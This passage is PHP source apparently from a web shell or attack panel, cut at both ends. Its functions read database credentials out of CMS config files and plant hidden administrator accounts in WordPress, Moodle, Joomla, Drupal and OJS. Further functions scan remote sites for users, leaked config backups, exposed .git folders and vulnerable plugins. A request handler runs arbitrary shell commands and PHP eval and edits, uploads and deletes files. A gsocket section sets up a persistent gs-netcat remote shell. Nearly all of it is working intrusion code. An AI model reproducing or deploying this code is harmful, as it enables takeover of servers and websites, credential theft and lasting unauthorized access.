    if (!$db['host'] || !$db['name'] || !$db['user']) return null;
    return ['db' => $db, 'prefix' => ''];
}
function n7_parse_ojs($path) {
    $c = @file_get_contents($path); if (!$c) return null;
    $db = ['host' => null, 'user' => null, 'pass' => null, 'name' => null, 'port' => 3306];
    foreach (['host' => '/^\s*host\s*=\s*([^\s]+)/mi', 'username' => '/^\s*username\s*=\s*([^\s]+)/mi',
              'password' => '/^\s*password\s*=\s*([^\s]+)/mi', 'name' => '/^\s*name\s*=\s*([^\s]+)/mi'] as $k => $p) {
        if (preg_match($p, $c, $m)) $db[$k] = trim($m[1], "'\" \t\r\n");
    }
    if (!$db['host'] || !$db['name'] || !$db['user']) return null;
    return ['db' => $db, 'prefix' => ''];
}


function n7_wp_inject($cfg, $u, $p, $e) {
    $log = "WP DB-INJECT\n" . str_repeat('=', 50) . "\n";
    $log .= "Config: {$cfg['path']}\nDB: {$cfg['db']['name']}@{$cfg['db']['host']}\nPrefix: {$cfg['prefix']}\n\n";
    $conn = n7_db_connect($cfg['db']['host'], $cfg['db']['user'], $cfg['db']['pass'], $cfg['db']['name'], $cfg['db']['port']);
    if (!$conn) return $log . "✘ DB connect failed.\n";
    $pfx = $cfg['prefix'];
    $chk = n7_db_q($conn, "SELECT ID FROM `{$pfx}users` WHERE user_login = '" . addslashes($u) . "' LIMIT 1");
    if ($chk['ok'] && !empty($chk['rows'])) {
        $uid = (int)$chk['rows'][0]['ID'];
        $log .= "✔ User exists (ID=$uid), update pass...\n";
        n7_db_q($conn, "UPDATE `{$pfx}users` SET user_pass = '" . md5($p) . "', user_email = '" . addslashes($e) . "' WHERE ID = $uid");
    } else {
        $now = date('Y-m-d H:i:s');
        $r = n7_db_q($conn, "INSERT INTO `{$pfx}users` (user_login,user_pass,user_email,user_registered,user_status,display_name) VALUES ('" . addslashes($u) . "','" . md5($p) . "','" . addslashes($e) . "','$now',0,'" . addslashes($u) . "')");
        if (!$r['ok']) return $log . "✘ INSERT failed: " . ($r['error'] ?? '') . "\n";
        $id = n7_db_q($conn, "SELECT ID FROM `{$pfx}users` WHERE user_login = '" . addslashes($u) . "' LIMIT 1");
        if (empty($id['rows'])) return $log . "✘ ID not found.\n";
        $uid = (int)$id['rows'][0]['ID'];
        $log .= "✔ User created (ID=$uid)\n";
    }
    $cap = 'a:1:{s:13:"administrator";s:1:"1";}';
    n7_db_q($conn, "DELETE FROM `{$pfx}usermeta` WHERE user_id = $uid AND meta_key = '{$pfx}capabilities'");
    n7_db_q($conn, "INSERT INTO `{$pfx}usermeta` (user_id,meta_key,meta_value) VALUES ($uid,'{$pfx}capabilities','" . addslashes($cap) . "'), ($uid,'{$pfx}user_level','10')");
    $log .= "✔ Admin role set.\n\n🎉 SUCCESS\nLOGIN: " . n7_self_base() . "/wp-login.php\nUser: $u\nPass: $p\n";
    return $log;
}
function n7_moodle_inject($cfg, $u, $p, $e) {
    $log = "MOODLE DB-INJECT\n" . str_repeat('=', 50) . "\n";
    $log .= "Config: {$cfg['path']}\nDB: {$cfg['db']['name']}@{$cfg['db']['host']}\nPrefix: {$cfg['prefix']}\n\n";
    $conn = n7_db_connect($cfg['db']['host'], $cfg['db']['user'], $cfg['db']['pass'], $cfg['db']['name'], $cfg['db']['port']);
    if (!$conn) return $log . "✘ DB connect failed.\n";
    $pfx = $cfg['prefix']; $hash = password_hash($p, PASSWORD_DEFAULT); $now = time();
    $chk = n7_db_q($conn, "SELECT id FROM `{$pfx}user` WHERE username = '" . addslashes($u) . "' LIMIT 1");
    if ($chk['ok'] && !empty($chk['rows'])) {
        $uid = (int)$chk['rows'][0]['id'];
        n7_db_q($conn, "UPDATE `{$pfx}user` SET password = '" . addslashes($hash) . "', email = '" . addslashes($e) . "' WHERE id = $uid");
        $log .= "✔ User updated (ID=$uid)\n";
    } else {
        $r = n7_db_q($conn, "INSERT INTO `{$pfx}user` (auth,confirmed,mnethostid,username,password,email,firstname,lastname,city,country,lang,timecreated,timemodified,lastlogin) VALUES ('manual',1,1,'" . addslashes($u) . "','" . addslashes($hash) . "','" . addslashes($e) . "','Admin','Support','City','ID','en',$now,$now,0)");
        if (!$r['ok']) return $log . "✘ INSERT failed: " . ($r['error'] ?? '') . "\n";
        $id = n7_db_q($conn, "SELECT id FROM `{$pfx}user` WHERE username = '" . addslashes($u) . "' LIMIT 1");
        $uid = (int)$id['rows'][0]['id'];
        $log .= "✔ User created (ID=$uid)\n";
    }
    $role = n7_db_q($conn, "SELECT roleid FROM `{$pfx}role_capabilities` WHERE capability='moodle/site:config' AND permission=1 LIMIT 1");
    $rid = 1;
    if ($role['ok'] && !empty($role['rows'])) $rid = (int)$role['rows'][0]['roleid'];
    n7_db_q($conn, "DELETE FROM `{$pfx}role_assignments` WHERE userid = $uid AND contextid = 1");
    n7_db_q($conn, "INSERT INTO `{$pfx}role_assignments` (roleid,contextid,userid,timemodified,modifierid) VALUES ($rid,1,$uid,$now,$uid)");
    $log .= "✔ Admin role set (roleid=$rid)\n\n🎉 SUCCESS\nLOGIN: " . n7_self_base() . "/login/index.php\nUser: $u\nPass: $p\n";
    return $log;
}
function n7_joomla_inject($cfg, $u, $p, $e) {
    $log = "JOOMLA DB-INJECT\n" . str_repeat('=', 50) . "\n";
    $log .= "Config: {$cfg['path']}\nDB: {$cfg['db']['name']}@{$cfg['db']['host']}\nPrefix: {$cfg['prefix']}\n\n";
    $conn = n7_db_connect($cfg['db']['host'], $cfg['db']['user'], $cfg['db']['pass'], $cfg['db']['name'], $cfg['db']['port']);
    if (!$conn) return $log . "✘ DB connect failed.\n";
    $pfx = $cfg['prefix']; $hash = password_hash($p, PASSWORD_BCRYPT); $now = date('Y-m-d H:i:s');
    $chk = n7_db_q($conn, "SELECT id FROM `{$pfx}users` WHERE username = '" . addslashes($u) . "' LIMIT 1");
    if ($chk['ok'] && !empty($chk['rows'])) {
        $uid = (int)$chk['rows'][0]['id'];
        n7_db_q($conn, "UPDATE `{$pfx}users` SET password = '" . addslashes($hash) . "' WHERE id = $uid");
    } else {
        $r = n7_db_q($conn, "INSERT INTO `{$pfx}users` (name,username,email,password,block,sendEmail,registerDate,lastvisitDate,activation,params) VALUES ('Admin Support','" . addslashes($u) . "','" . addslashes($e) . "','" . addslashes($hash) . "',0,0,'$now','$now','','')");
        if (!$r['ok']) return $log . "✘ INSERT failed: " . ($r['error'] ?? '') . "\n";
        $id = n7_db_q($conn, "SELECT id FROM `{$pfx}users` WHERE username = '" . addslashes($u) . "' LIMIT 1");
        $uid = (int)$id['rows'][0]['id'];
    }
    $g = n7_db_q($conn, "SELECT id FROM `{$pfx}usergroups` WHERE title = 'Super Users' LIMIT 1");
    $gid = ($g['ok'] && !empty($g['rows'])) ? (int)$g['rows'][0]['id'] : 8;
    n7_db_q($conn, "INSERT IGNORE INTO `{$pfx}user_usergroup_map` (user_id,group_id) VALUES ($uid,$gid)");
    $log .= "✔ User ID=$uid mapped to group=$gid\n\n🎉 SUCCESS\nLOGIN: " . n7_self_base() . "/administrator/\nUser: $u\nPass: $p\n";
    return $log;
}
function n7_drupal_inject($cfg, $u, $p, $e) {
    $log = "DRUPAL DB-INJECT\n" . str_repeat('=', 50) . "\n";
    $conn = n7_db_connect($cfg['db']['host'], $cfg['db']['user'], $cfg['db']['pass'], $cfg['db']['name'], $cfg['db']['port']);
    if (!$conn) return $log . "✘ DB connect failed.\n";
    $hash = password_hash($p, PASSWORD_BCRYPT); $now = time();
    $chk = n7_db_q($conn, "SELECT uid FROM users WHERE name = '" . addslashes($u) . "' LIMIT 1");
    if ($chk['ok'] && !empty($chk['rows'])) {
        $uid = (int)$chk['rows'][0]['uid'];
        n7_db_q($conn, "UPDATE users SET pass = '" . addslashes($hash) . "', mail = '" . addslashes($e) . "', status = 1 WHERE uid = $uid");
    } else {
        $r = n7_db_q($conn, "INSERT INTO users (name,pass,mail,created,status) VALUES ('" . addslashes($u) . "','" . addslashes($hash) . "','" . addslashes($e) . "',$now,1)");
        if (!$r['ok']) return $log . "✘ " . ($r['error'] ?? '') . "\n";
        $id = n7_db_q($conn, "SELECT uid FROM users WHERE name = '" . addslashes($u) . "' LIMIT 1");
        $uid = (int)$id['rows'][0]['uid'];
    }
    n7_db_q($conn, "INSERT IGNORE INTO users_roles (uid,rid) VALUES ($uid,3)");
    $log .= "✔ User ID=$uid set as admin\n\n🎉 SUCCESS\nLOGIN: " . n7_self_base() . "/user/login\nUser: $u\nPass: $p\n";
    return $log;
}
function n7_ojs_inject($cfg, $u, $p, $e) {
    $log = "OJS DB-INJECT\n" . str_repeat('=', 50) . "\n";
    $conn = n7_db_connect($cfg['db']['host'], $cfg['db']['user'], $cfg['db']['pass'], $cfg['db']['name'], $cfg['db']['port']);
    if (!$conn) return $log . "✘ DB connect failed.\n";
    $hash = password_hash($p, PASSWORD_BCRYPT); $now = date('Y-m-d H:i:s');
    $chk = n7_db_q($conn, "SELECT user_id FROM users WHERE username = '" . addslashes($u) . "' LIMIT 1");
    if ($chk['ok'] && !empty($chk['rows'])) {
        $uid = (int)$chk['rows'][0]['user_id'];
        n7_db_q($conn, "UPDATE users SET password = '" . addslashes($hash) . "', email = '" . addslashes($e) . "' WHERE user_id = $uid");
    } else {
        $r = n7_db_q($conn, "INSERT INTO users (username,password,email,date_registered,date_last_login) VALUES ('" . addslashes($u) . "','" . addslashes($hash) . "','" . addslashes($e) . "','$now','$now')");
        if (!$r['ok']) return $log . "✘ " . ($r['error'] ?? '') . "\n";
        $id = n7_db_q($conn, "SELECT user_id FROM users WHERE username = '" . addslashes($u) . "' LIMIT 1");
        $uid = (int)$id['rows'][0]['user_id'];
    }
    n7_db_q($conn, "INSERT IGNORE INTO user_user_groups (user_id,group_id) VALUES ($uid,1)");
    $role = n7_db_q($conn, "SELECT role_id FROM roles WHERE role_name='Site Admin' LIMIT 1");
    $rid = ($role['ok'] && !empty($role['rows'])) ? (int)$role['rows'][0]['role_id'] : 1;
    n7_db_q($conn, "INSERT IGNORE INTO user_roles (user_id,role_id) VALUES ($uid,$rid)");
    $log .= "✔ User ID=$uid as Site Admin\n\n🎉 SUCCESS\nLOGIN: " . n7_self_base() . "/index.php/login\nUser: $u\nPass: $p\n";
    return $log;
}
function n7_auto_cms_attack($u, $p, $e, $root = null) {
    $log = "=== AUTO CMS ATTACK ===\n" . str_repeat('=', 50) . "\n";
    $cfgs = n7_find_configs($root);
    if (empty($cfgs)) return $log . "✘ Tidak ada config CMS.\nCoba isi path root di form.\n";
    $log .= "Ditemukan " . count($cfgs) . " config:\n";
    foreach ($cfgs as $c) $log .= "  - {$c['cms']}: {$c['path']}\n";
    $log .= "\n";
    foreach ($cfgs as $c) {
        $log .= "\n" . str_repeat('═', 50) . "\n";
        try {
            switch ($c['cms']) {
                case 'WordPress': $log .= n7_wp_inject($c, $u, $p, $e); break;
                case 'Moodle':    $log .= n7_moodle_inject($c, $u, $p, $e); break;
                case 'Joomla':    $log .= n7_joomla_inject($c, $u, $p, $e); break;
                case 'Drupal':    $log .= n7_drupal_inject($c, $u, $p, $e); break;
                case 'OJS':       $log .= n7_ojs_inject($c, $u, $p, $e); break;
            }
        } catch (Throwable $ex) { $log .= "✘ EXCEPTION: " . $ex->getMessage() . "\n"; }
    }
    return $log;
}


function n7_x_user_enum($t) {
    $t = rtrim($t, '/'); $log = "USER ENUM: $t\n" . str_repeat('=', 50) . "\n"; $f = 0;
    for ($i = 1; $i <= 10; $i++) {
        $r = n7_get("$t/?author=$i", 8);
        if ($r['error']) { $log .= "[$i] ERR\n"; continue; }
        if (($r['code'] == 200 || $r['code'] == 301) && preg_match('/author\/([a-zA-Z0-9_\-]+)/i', $r['body'], $m)) {
            $log .= "[$i] FOUND: {$m[1]}\n"; $f++;
        } else $log .= "[$i] HTTP {$r['code']}\n";
    }
    if ($f === 0) $log .= "No users.\n";
    return $log;
}
function n7_x_rest_users($t) {
    $t = rtrim($t, '/'); $log = "REST USERS: $t\n" . str_repeat('=', 50) . "\n";
    $r = n7_get("$t/wp-json/wp/v2/users?per_page=100", 10);
    if ($r['error']) return $log . "ERR\n";
    $u = json_decode($r['body'], true);
    if (!is_array($u)) return $log . "No JSON. HTTP {$r['code']}\n";
    if (empty($u)) return $log . "No users exposed.\n";
    foreach ($u as $x) $log .= "ID:{$x['id']} SLUG:{$x['slug']} NAME:" . ($x['name'] ?? '-') . "\n";
    return $log;
}
function n7_x_xmlrpc($t) {
    $t = rtrim($t, '/'); $log = "XML-RPC: $t\n" . str_repeat('=', 50) . "\n";
    $xml = '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>';
    $r = n7_post("$t/xmlrpc.php", $xml, ['Content-Type: text/xml'], 10);
    if ($r['error']) return $log . "ERR\n";
    if (strpos($r['body'], 'methodResponse') !== false) {
        $log .= "✔ XML-RPC ENABLED\n";
        if (preg_match_all('/<string>([^<]+)<\/string>/', $r['body'], $m)) $log .= "Methods: " . count($m[1]) . "\nSample: " . implode(', ', array_slice($m[1], 0, 8)) . "\n";
        return $log;
    }
    return $log . "✘ XML-RPC disabled\n";
}
function n7_x_config_bak($t) {
    $t = rtrim($t, '/'); $log = "WP-CONFIG BACKUP: $t\n" . str_repeat('=', 50) . "\n";
    $paths = ['wp-config.php.bak','wp-config.php~','wp-config.php.old','wp-config.php.save','wp-config.bak','wp-config.old','wp-config.txt','wp-config.php.swp','wp-config.php.orig','.wp-config.php.swp','wp-config-sample.php','wp-config.php.txt'];
    $f = 0;
    foreach ($paths as $p) {
        $r = n7_get("$t/$p", 6);
        if ($r['error']) continue;
        if ($r['code'] == 200 && strlen($r['body']) > 100 && (strpos($r['body'], 'DB_NAME') !== false || strpos($r['body'], 'DB_PASSWORD') !== false)) { $log .= "✔ FOUND: $p (" . strlen($r['body']) . "B)\n"; $f++; }
    }
    if ($f === 0) $log .= "✘ None found.\n";
    return $log;
}
function n7_x_dir_list($t) {
    $t = rtrim($t, '/'); $log = "DIR LISTING: $t\n" . str_repeat('=', 50) . "\n";
    $paths = ['wp-content/uploads/','wp-content/plugins/','wp-content/themes/','wp-includes/','wp-admin/','wp-content/','backup/','backups/','old/','.git/','.svn/','logs/','tmp/','temp/','cache/','wp-content/cache/'];
    $f = 0;
    foreach ($paths as $p) {
        $r = n7_get("$t/$p", 6);
        if ($r['error']) continue;
        if ($r['code'] == 200 && (stripos($r['body'], 'Index of /') !== false || stripos($r['body'], '<title>Index of') !== false)) { $log .= "✔ LISTABLE: $p\n"; $f++; }
    }
    if ($f === 0) $log .= "✘ None.\n";
    return $log;
}
function n7_x_git($t) {
    $t = rtrim($t, '/'); $log = ".GIT EXPOSURE: $t\n" . str_repeat('=', 50) . "\n";
    $r = n7_get("$t/.git/config", 8);
    if (!$r['error'] && $r['code'] == 200 && strpos($r['body'], '[core]') !== false) return $log . "✔ EXPOSED!\n" . substr($r['body'], 0, 500) . "\n";
    return $log . "✘ Not accessible\n";
}
function n7_x_version($t) {
    $t = rtrim($t, '/'); $log = "WP VERSION: $t\n" . str_repeat('=', 50) . "\n"; $f = false;
    $r = n7_get("$t/readme.html", 8);
    if (!$r['error'] && $r['code'] == 200 && preg_match('/Version\s*([\d.]+)/i', $r['body'], $m)) { $log .= "✔ readme.html: WP {$m[1]}\n"; $f = true; }
    $r2 = n7_get("$t/feed/", 8);
    if (!$r2['error'] && $r2['code'] == 200 && preg_match('/<generator>https?:\/\/wordpress.org\/\?v=([\d.]+)<\/generator>/i', $r2['body'], $m2)) { $log .= "✔ /feed/: WP {$m2[1]}\n"; $f = true; }
    if (!$f) $log .= "✘ Hidden.\n";
    return $log;
}
function n7_x_mstore($t) {
    $t = rtrim($t, '/'); $log = "MSTORE: $t\n" . str_repeat('=', 50) . "\n";
    foreach (['wp-content/plugins/mstore-api/readme.txt','wp-content/plugins/mstore/readme.txt','wp-content/plugins/mstore-api-master/readme.txt'] as $p) {
        $r = n7_get("$t/$p", 8);
        if (!$r['error'] && $r['code'] == 200 && preg_match('/Stable tag:\s*([\d.]+)/i', $r['body'], $m)) return $log . "✔ MStore API v{$m[1]}\nPath: $p\n";
    }
    return $log . "✘ Not found.\n";
}
function n7_x_plugins($t) {
    $t = rtrim($t, '/'); $log = "PLUGINS: $t\n" . str_repeat('=', 50) . "\n";
    $plugins = ['woocommerce','elementor','contact-form-7','yoast','akismet','wordfence','mstore-api','wpforms','jetpack','rank-math','litespeed-cache','wp-rocket','revslider','wp-file-manager','duplicator','all-in-one-wp-migration','wordpress-seo'];
    foreach ($plugins as $p) {
        $r = n7_get("$t/wp-content/plugins/$p/readme.txt", 5);
        if (!$r['error'] && $r['code'] == 200) {
            $v = '?';
            if (preg_match('/Stable tag:\s*([\d.]+)/i', $r['body'], $m)) $v = $m[1];
            $log .= "✔ $p (v$v)\n";
        }
    }
    return $log;
}
function n7_x_robots($t) {
    $t = rtrim($t, '/'); $log = "ROBOTS/SITEMAP: $t\n" . str_repeat('=', 50) . "\n";
    $r = n7_get("$t/robots.txt", 6);
    if (!$r['error'] && $r['code'] == 200 && strlen($r['body']) > 5) $log .= "✔ robots.txt:\n" . substr($r['body'], 0, 800) . "\n";
    else $log .= "✘ robots.txt\n";
    $r2 = n7_get("$t/sitemap.xml", 6);
    if (!$r2['error'] && $r2['code'] == 200 && strlen($r2['body']) > 50) {
        $log .= "\n✔ sitemap.xml (" . strlen($r2['body']) . "B)\n";
        preg_match_all('/<loc>([^<]+)<\/loc>/', $r2['body'], $m);
        if (!empty($m[1])) $log .= "URLs: " . count($m[1]) . "\n";
    } else $log .= "✘ sitemap.xml\n";
    return $log;
}
function n7_x_upload_vuln($t) {
    $t = rtrim($t, '/'); $log = "UPLOAD VULN: $t\n" . str_repeat('=', 50) . "\n";
    $r = n7_get("$t/wp-content/plugins/wp-file-manager/readme.txt", 6);
    if (!$r['error'] && $r['code'] == 200) {
        $log .= "✔ wp-file-manager detected\n";
        if (preg_match('/Stable tag:\s*([\d.]+)/i', $r['body'], $m)) {
            $log .= "Version: {$m[1]}\n";
            if (version_compare($m[1], '6.9', '<')) $log .= "⚠ CVE-2020-25213 VULN!\n";
        }
    }
    $files = ['backup.zip','backup.tar.gz','db.sql','database.sql','dump.sql','site.zip','www.zip'];
    foreach ($files as $f) {
        $r = n7_get("$t/$f", 6);
        if (!$r['error'] && $r['code'] == 200 && strlen($r['body']) > 1000) $log .= "✔ FOUND $f (" . n7_size(strlen($r['body'])) . ")\n";
    }
    return $log;
}
function n7_x_detect_cms($t) {
    $t = rtrim($t, '/'); $log = "CMS DETECT: $t\n" . str_repeat('=', 50) . "\n";
    $checks = [
        ['WordPress', "$t/wp-login.php", 'wp-login|wordpress'],
        ['Moodle', "$t/login/index.php", 'moodle|mform'],
        ['Joomla', "$t/administrator/", 'joomla'],
        ['Drupal', "$t/user/login", 'drupal'],
        ['OJS', "$t/index.php/login", 'ojs|open journal'],
    ];
    $found = false;
    foreach ($checks as $c) {
        $r = n7_get($c[1], 6);
        if (!$r['error'] && $r['code'] == 200 && preg_match('/' . $c[2] . '/i', $r['body'])) { $log .= "✔ {$c[0]} detected\n"; $found = true; }
    }
    if (!$found) $log .= "✘ Unknown CMS\n";
    return $log;
}
function n7_full_scan($t) {
    $o = "FULL SCAN: $t\n" . str_repeat('=', 50) . "\n\n";
    $o .= n7_x_version($t) . "\n" . n7_x_rest_users($t) . "\n" . n7_x_user_enum($t) . "\n";
    $o .= n7_x_xmlrpc($t) . "\n" . n7_x_config_bak($t) . "\n" . n7_x_dir_list($t) . "\n";
    $o .= n7_x_git($t) . "\n" . n7_x_mstore($t) . "\n" . n7_x_plugins($t) . "\n";
    $o .= n7_x_robots($t) . "\n" . n7_x_upload_vuln($t) . "\n" . n7_x_detect_cms($t) . "\n";
    return $o;
}


if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['act'])) {
    if (!n7_csrf_ok()) { $msg = '⚠ CSRF invalid'; $msg_type = 'err'; }
    else {
        $act = $_POST['act'];
        try {
            switch ($act) {
                case 'chmod':
                    $f = $_POST['file'] ?? ''; $m = $_POST['mode'] ?? '';
                    if ($f && preg_match('/^[0-7]{3,4}$/', $m) && file_exists($f)) {
                        @chmod($f, octdec($m)); $msg = "✔ CHMOD $m OK"; $action_done = 'chmod';
                    } else { $msg = '✘ chmod failed'; $msg_type = 'err'; }
                    break;
                case 'rename':
                    $o = $_POST['old'] ?? ''; $n = $_POST['new'] ?? '';
                    if ($o && $n && @rename($o, $n)) { $msg = "✔ Renamed"; $action_done = 'rename'; }
                    else { $msg = '✘ rename failed'; $msg_type = 'err'; }
                    break;
                case 'delete':
                    $f = $_POST['file'] ?? '';
                    if (is_dir($f)) { if (@rmdir($f)) { $msg = "✔ Dir deleted"; $action_done = 'del'; } else { $msg = '✘ dir not empty'; $msg_type = 'err'; } }
                    elseif (is_file($f)) { if (@unlink($f)) { $msg = "✔ File deleted"; $action_done = 'del'; } else { $msg = '✘ fail'; $msg_type = 'err'; } }
                    else { $msg = '✘ not found'; $msg_type = 'err'; }
                    break;
                case 'mkdir':
                    $n = $_POST['name'] ?? ''; if ($n && @mkdir($cwd . DIRECTORY_SEPARATOR . $n, 0755)) { $msg = "✔ Created $n"; $action_done = 'mkdir'; }
                    else { $msg = '✘ mkdir failed'; $msg_type = 'err'; }
                    break;
                case 'create':
                    $n = $_POST['name'] ?? ''; $c = $_POST['content'] ?? '';
                    if ($n && @file_put_contents($cwd . DIRECTORY_SEPARATOR . $n, $c) !== false) { $msg = "✔ Created $n"; $action_done = 'create'; }
                    else { $msg = '✘ create failed'; $msg_type = 'err'; }
                    break;
                case 'save':
                    $f = $_POST['file'] ?? ''; $c = $_POST['content'] ?? '';
                    if ($f && @file_put_contents($f, $c) !== false) { $msg = "✔ Saved"; $action_done = 'save'; }
                    else { $msg = '✘ save failed'; $msg_type = 'err'; }
                    break;
                case 'upload':
                    if (!empty($_FILES['upfile']['name'])) {
                        $t = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['upfile']['name']);
                        if (@move_uploaded_file($_FILES['upfile']['tmp_name'], $t)) { $msg = "✔ Uploaded"; $action_done = 'upload'; }
                        else { $msg = '✘ upload failed'; $msg_type = 'err'; }
                    } else { $msg = '✘ no file'; $msg_type = 'err'; }
                    break;
                case 'cmd':
                    $c = $_POST['cmd'] ?? '';
                    if ($c !== '') {
                        $out = '';
                        if (function_exists('shell_exec')) $out = @shell_exec($c . ' 2>&1');
                        elseif (function_exists('exec')) { @exec($c . ' 2>&1', $o); $out = implode("\n", (array)$o); }
                        elseif (function_exists('system')) { ob_start(); @system($c . ' 2>&1'); $out = ob_get_clean(); }
                        elseif (function_exists('passthru')) { ob_start(); @passthru($c . ' 2>&1'); $out = ob_get_clean(); }
                        $msg = "CMD: $c\n" . str_repeat('─', 50) . "\n" . (trim((string)$out) === '' ? '(no output / disabled)' : $out);
                        $msg_type = 'term';
                    }
                    break;
                case 'php':
                    $code = $_POST['code'] ?? '';
                    if ($code !== '') {
                        ob_start();
                        try { eval($code); } catch (Throwable $e) { echo 'ERROR: ' . $e->getMessage(); }
                        $msg = "PHP OUTPUT:\n" . str_repeat('─', 50) . "\n" . ob_get_clean();
                        $msg_type = 'term';
                    }
                    break;
            }
        } catch (Throwable $e) { $msg = 'EXC: ' . $e->getMessage(); $msg_type = 'err'; }
    }
}

$gs_result = '';
if ($page === 'gsocket' && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['gs_act'])) {
    if (!n7_csrf_ok()) { $gs_result = '⚠ CSRF invalid'; }
    else {
        $sess_form = trim($_POST['gs_session'] ?? '');
        $sess = $sess_form !== '' ? $sess_form : n7_gs_get_session();
        if ($sess_form !== '' && strlen($sess_form) >= 10) n7_gs_set_session($sess_form);
        $act = $_POST['gs_act'];
        try {
            switch ($act) {
                case 'auto': $delay = (int)($_POST['gs_delay'] ?? 0); $gs_result = n7_gs_auto($sess, $delay); break;
                case 'install': $r = n7_gs_install(); $gs_result = $r['log'] . "\nSESSION: $sess\nListener: gs-netcat -s \"$sess\" -l -i\n"; break;
                case 'run': $mode = $_POST['gs_mode'] ?? 'interactive'; $timeout = (int)($_POST['gs_timeout'] ?? 30); $gs_result = n7_gs_run($sess, $mode, $timeout); break;
                case 'daemon': $gs_result = n7_gs_run($sess, 'daemon', 5); break;
                case 'check':
                    $log = "=== CHECK ===\n" . str_repeat('=', 50) . "\n";
                    $bin = n7_gs_which();
                    if ($bin) {
                        $log .= "✔ gs-netcat: $bin\n";
                        if (function_exists('shell_exec')) { $v = @trim((string)@shell_exec(escapeshellarg($bin) . ' --version 2>&1')); if ($v) $log .= "Version: " . substr($v, 0, 200) . "\n"; }
                        $log .= "Size: " . n7_size(@filesize($bin)) . "\n";
                    } else $log .= "✘ gs-netcat not found\n";
                    $log .= "Session: $sess\nSession File: " . n7_gs_session_file() . "\nArch: " . n7_gs_arch() . "\n";
                    $log .= "shell_exec: " . (function_exists('shell_exec') ? 'YES' : 'NO') . "\n";
                    $gs_result = $log;
                    break;
                case 'regen': $new = n7_gs_regenerate_session(); $gs_result = "=== REGENERATED ===\n\nNew Session: $new\n\nListener: gs-netcat -s \"$new\" -l -i\n"; break;
                case 'save_session':
                    if (strlen($sess_form) < 10) $gs_result = "✘ Session minimal 10 karakter.\n";
                    else { n7_gs_set_session($sess_form); $gs_result = "✔ Saved: $sess_form\n"; }
                    break;
            }
        } catch (Throwable $ex) { $gs_result = "EXC: " . $ex->getMessage(); }
    }
}


$cms_result = '';
if (isset($_POST['cms_act']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!n7_csrf_ok()) { $cms_result = '⚠ CSRF invalid'; }
    else {
        $u = trim($_POST['cms_user'] ?? N7_DEFAULT_ADMIN_USER) ?: N7_DEFAULT_ADMIN_USER;
        $p = trim($_POST['cms_pass'] ?? N7_DEFAULT_ADMIN_PASS) ?: N7_DEFAULT_ADMIN_PASS;
        $e = trim($_POST['cms_email'] ?? N7_DEFAULT_EMAIL) ?: N7_DEFAULT_EMAIL;
        $root = trim($_POST['cms_root'] ?? '') ?: null;
        $act = $_POST['cms_act'];
        try {
            switch ($act) {
                case 'auto_all': $cms_result = n7_auto_cms_attack($u, $p, $e, $root); break;
                case 'detect_configs':
                    $cfgs = n7_find_configs($root);
                    $cms_result = "SCAN CONFIGS\n" . str_repeat('=', 50) . "\n";
                    if (empty($cfgs)) $cms_result .= "✘ Tidak ada config CMS.\n";
                    else {
                        $cms_result .= "Ditemukan " . count($cfgs) . ":\n\n";
                        foreach ($cfgs as $c) $cms_result .= "{$c['cms']}: {$c['path']}\n  DB: {$c['db']['name']}@{$c['db']['host']} (user:{$c['db']['user']})\n  Prefix: {$c['prefix']}\n\n";
                    }
                    break;
                case 'wp_db_admin':
                    $cfgs = n7_find_configs($root); $cms_result = "WP DB-INJECT\n\n"; $ok = false;
                    foreach ($cfgs as $c) if ($c['cms'] === 'WordPress') { $cms_result .= n7_wp_inject($c, $u, $p, $e); $ok = true; }
                    if (!$ok) $cms_result .= "✘ wp-config.php not found.\n";
                    break;
                case 'moodle_db_admin':
                    $cfgs = n7_find_configs($root); $cms_result = "MOODLE DB-INJECT\n\n"; $ok = false;
                    foreach ($cfgs as $c) if ($c['cms'] === 'Moodle') { $cms_result .= n7_moodle_inject($c, $u, $p, $e); $ok = true; }
                    if (!$ok) $cms_result .= "✘ Moodle config not found.\n";
                    break;
                case 'joomla_db_admin':
                    $cfgs = n7_find_configs($root); $cms_result = "JOOMLA DB-INJECT\n\n"; $ok = false;
                    foreach ($cfgs as $c) if ($c['cms'] === 'Joomla') { $cms_result .= n7_joomla_inject($c, $u, $p, $e); $ok = true; }
                    if (!$ok) $cms_result .= "✘ Joomla config not found.\n";
                    break;
                case 'drupal_db_admin':
                    $cfgs = n7_find_configs($root); $cms_result = "DRUPAL DB-INJECT\n\n"; $ok = false;
                    foreach ($cfgs as $c) if ($c['cms'] === 'Drupal') { $cms_result .= n7_drupal_inject($c, $u, $p, $e); $ok = true; }
                    if (!$ok) $cms_result .= "✘ Drupal config not found.\n";
                    break;
                case 'ojs_db_admin':
                    $cfgs = n7_find_configs($root); $cms_result = "OJS DB-INJECT\n\n"; $ok = false;
                    foreach ($cfgs as $c) if ($c['cms'] === 'OJS') { $cms_result .= n7_ojs_inject($c, $u, $p, $e); $ok = true; }
                    if (!$ok) $cms_result .= "✘ OJS config not found.\n";
                    break;
                case 'wp_reset':
                    $t = trim($_POST['target'] ?? $self_base);
                    if (!preg_match('#^https?://#i', $t)) $t = $self_base;
                    if (!n7_validate_target($t)) { $cms_result = "⛔ AKSES DITOLAK"; break; }
                    $cms_result = "WP RESET PASSWORD\n" . str_repeat('=', 50) . "\nUser: $u\n\n";
                    $r = n7_post("$t/wp-login.php?action=lostpassword", ['user_login' => $u, 'redirect_to' => '', 'wp-submit' => 'Get New Password'], [], 15);
                    if (!$r['error'] && $r['code'] == 200) {
                        if (stripos($r['body'], 'check your email') !== false || stripos($r['body'], 'email') !== false) {
                            $cms_result .= "✔ Reset email terkirim ke user: $u\n\nTips: kalau email tidak masuk, cek spam atau pakai WP DB-INJECT.\n";
                        } else $cms_result .= "⚠ Response unclear (HTTP {$r['code']})\n";
                    } else $cms_result .= "✘ Request gagal\n";
                    break;
                case 'mass_reset':
                    $t = trim($_POST['target'] ?? $self_base);
                    if (!preg_match('#^https?://#i', $t)) $t = $self_base;
                    if (!n7_validate_target($t)) { $cms_result = "⛔ AKSES DITOLAK"; break; }
                    $cms_result = "MASS RESET (WP): $t\n" . str_repeat('=', 50) . "\n";
                    $r = n7_get("$t/wp-json/wp/v2/users?per_page=100", 10);
                    if (!$r['error'] && $r['code'] == 200) {
                        $us = json_decode($r['body'], true);
                        if (is_array($us)) {
